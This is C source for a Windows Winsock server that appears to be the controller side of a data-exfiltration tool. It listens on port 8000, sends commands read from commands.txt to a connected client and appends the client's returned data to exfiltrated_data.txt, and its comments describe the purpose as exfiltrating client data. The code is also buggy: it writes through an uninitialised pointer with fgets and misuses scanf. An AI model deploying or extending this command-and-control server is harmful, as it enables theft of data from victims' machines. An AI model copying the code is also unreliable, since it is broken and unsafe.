#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <unistd.h>
#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 8000
#define DEFAULT_BUFLEN 512
int count = 0;

int main(int argc, char *argv[])
{
    /*
    Ther server side will be listening at port 8000. Once the client connects by execuring client.c, server reads contents from commands.txt and sends it to client.
    Client data will be exfiltrated based on the command sent (FindFirstFile is the only command valid for this sample. Improvisations can be made) which is stored in received_file.txt
    */
    
    WSADATA wsaData;
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;
    struct sockaddr_in serverService;
    char sendbuf[DEFAULT_BUFLEN];
    int iResult;

    while (1)
    {
        // Initialize Winsock
        iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0)
        {
            printf("WSAStartup failed with error: %d\n", iResult);
            return 1;
        }

        // Create a socket for listening
        ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (ListenSocket == INVALID_SOCKET)
        {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Specify server address and port
        if (count == 0)
        {
            memset(&serverService, 0, sizeof(serverService));
            serverService.sin_family = AF_INET;
            serverService.sin_addr.s_addr = htonl(INADDR_ANY);
            serverService.sin_port = htons(DEFAULT_PORT);

            // Bind socket to server address and port
            iResult = bind(ListenSocket, (SOCKADDR *)&serverService, sizeof(serverService));
            if (iResult == SOCKET_ERROR)
            {
                printf("bind failed with error: %d\n", WSAGetLastError());
                closesocket(ListenSocket);
                WSACleanup();
                return 1;
            }

            // Listen for incoming connections
            iResult = listen(ListenSocket, SOMAXCONN);
            if (iResult == SOCKET_ERROR)
            {
                printf("listen failed with error: %d\n", WSAGetLastError());
                closesocket(ListenSocket);
                WSACleanup();
                return 1;
            }

            // Accept a client connection
            printf("Waiting for client connection...\n");
            ClientSocket = accept(ListenSocket, NULL, NULL);
            if (ClientSocket == INVALID_SOCKET)
            {
                printf("accept failed with error: %d\n", WSAGetLastError());
                closesocket(ListenSocket);
                WSACleanup();
                return 1;
            }
            printf("Client connected!\n");
        }
        // Send FindFirstFile command to client
        // char* command = "FindFirstFile";

        // Read contents from a file. This file can contain list of commands to be executed in realworld.
        FILE *fp;
        fp = fopen("commands.txt", "r");
        char *command;
        fgets(command, 14, fp);
        scanf("Enter command:  %s", &command);

        iResult = send(ClientSocket, command, strlen(command) + 1, 0);
        if (iResult == SOCKET_ERROR)
        {
            printf("send failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

        // Receive file from client

        FILE *file = fopen("exfiltrated_data.txt", "a+");
        if (file == NULL)
        {
            printf("Failed to open file for writing\n");
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

        int bytes_received = 0;
        char recvbuf[DEFAULT_BUFLEN];
        // while (1) {
        iResult = recv(ClientSocket, recvbuf, DEFAULT_BUFLEN, 0);
        printf("%s", recvbuf);
        if (iResult == SOCKET_ERROR)
        {
            printf("recv failed with error: %d\n", WSAGetLastError());
            fclose(file);
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        } // If connection was closed by client, break loop
        if (iResult == 0)
        {
            printf("broke here");
            break;
        }

        // Write received data to file
        fwrite(recvbuf, 1, iResult, file);
        printf("fwrite here %s\n", recvbuf);
        bytes_received += iResult;
        fclose(file);
        printf("Received %d bytes\n", bytes_received);
        // sleep(1000);
        printf("I start looping again");
        count++;
        // }
    }
    // Cleanup and exit
    closesocket(ClientSocket);
    closesocket(ListenSocket);
    WSACleanup();
    return 0;
}
